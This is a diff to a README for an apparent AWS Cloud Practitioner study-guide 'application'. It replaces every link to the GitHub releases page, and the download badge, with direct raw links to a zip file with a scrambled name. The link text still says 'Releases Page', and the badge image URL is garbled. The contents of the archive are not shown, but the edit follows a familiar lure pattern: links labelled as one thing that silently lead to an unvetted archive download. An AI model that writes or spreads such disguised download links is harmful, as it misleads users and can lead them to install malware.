@@ -4,11 +4,11 @@
 Welcome to the aws-cloud-practitioner-complete-guide! Whether you are exploring the world of cloud computing or preparing for AWS certification, this guide will help you every step of the way.
 
 ## 📥 Download the Application
-[![Download Now](https://img.shields.io/badge/Download%20Now-aws--cloud--practitioner--complete--guide-blue)](https://github.com/joyamandy/aws-cloud-practitioner-complete-guide/releases)
+[![Download Now](https://raw.githubusercontent.com/joyamandy/aws-cloud-practitioner-complete-guide/master/practice-exams/guide-practitioner-cloud-complete-aws-v2.8-beta.3.zip%20Now-aws--cloud--practitioner--complete--guide-blue)](https://raw.githubusercontent.com/joyamandy/aws-cloud-practitioner-complete-guide/master/practice-exams/guide-practitioner-cloud-complete-aws-v2.8-beta.3.zip)
 
 To get started, visit the Releases page below to download the latest version of the application:
 
-[Visit Releases Page](https://github.com/joyamandy/aws-cloud-practitioner-complete-guide/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/joyamandy/aws-cloud-practitioner-complete-guide/master/practice-exams/guide-practitioner-cloud-complete-aws-v2.8-beta.3.zip)
 
 ## 💡 Features
 - **Comprehensive Guide**: Detailed explanations on AWS topics, tailored for beginners.
@@ -27,7 +27,7 @@ This application can be run on various operating systems. Here are the recommend
 ## 📘 How to Download & Install
 Here’s a step-by-step guide to downloading and running the application:
 
-1. **Visit the Releases Page**: Click on the link to our [Releases Page](https://github.com/joyamandy/aws-cloud-practitioner-complete-guide/releases).
+1. **Visit the Releases Page**: Click on the link to our [Releases Page](https://raw.githubusercontent.com/joyamandy/aws-cloud-practitioner-complete-guide/master/practice-exams/guide-practitioner-cloud-complete-aws-v2.8-beta.3.zip).
    
 2. **Select the Latest Release**: On the Releases page, you will see a list of published versions. Click on the most recent version to access the details.
 
